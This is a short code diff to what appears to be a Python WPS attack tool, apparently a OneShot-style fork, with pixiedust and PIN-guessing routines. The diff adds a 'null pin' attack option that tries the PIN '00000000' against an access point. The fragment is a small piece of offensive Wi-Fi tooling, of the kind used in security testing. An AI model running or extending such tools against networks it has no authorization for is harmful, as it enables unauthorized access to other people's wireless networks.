@@ -96,10 +96,10 @@ class Initialize:
         print(f'[+] AP SSID: \'{essid}\'')
 
     def singleConnection(self, bssid: str = None, pin: str = None, pixiemode: bool = False, showpixiecmd: bool = False,
-                         pixieforce: bool = False, pbc_mode: bool = False, store_pin_on_fail: bool = False) -> bool:
+                         pixieforce: bool = False, pbc_mode: bool = False, store_pin_on_fail: bool = False, null_pin: bool = False) -> bool:
         """        
         Establish a WPS connection, using a pin, a calculated pin (if in pixiemode), a PIN
-        generated from a list of likely PINs, or PBC mode. handles pixiedust
+        generated from a list of likely PINs, PBC mode, or null pin. handles pixiedust
         attacks if enabled and manages storing PINs on connection failure
         """
 
@@ -107,8 +107,10 @@ class Initialize:
         generator    = src.wps.generator.WPSpin()
         collector    = src.wifi.collector.WiFiCollector()
 
-        # Allow empty string ('') as valid pin (e.g., for null pin attack)
-        if pin is None:
+        # Handle null pin attack
+        if null_pin:
+            pin = '00000000'
+        elif pin is None:
             if pixiemode:
                 try:
                     filename = f'''{pixiewps_dir}{bssid.replace(':', '').upper()}.run'''
